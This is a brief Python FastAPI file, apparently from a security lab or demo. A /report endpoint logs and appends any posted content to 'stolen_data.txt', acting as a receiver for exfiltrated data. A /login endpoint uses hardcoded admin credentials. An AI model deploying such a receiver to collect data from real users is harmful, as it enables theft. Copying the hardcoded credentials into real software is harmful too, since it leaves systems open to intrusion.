from typing import Annotated
from fastapi import FastAPI, Form

app = FastAPI()

@app.post("/login")
def login(username: Annotated[str, Form()], password: Annotated[str, Form()]):
    if username == "admin" and password == "12345admin":
        return "secret token"
    return "Invalid credentials"

@app.post("/report")
def receive_logs(content: Annotated[str, Form()]):
    print(f"Captured Data: {content}")
    with open("stolen_data.txt", "a") as f:
        f.write(content + "\n")
    return {"status": "received"}
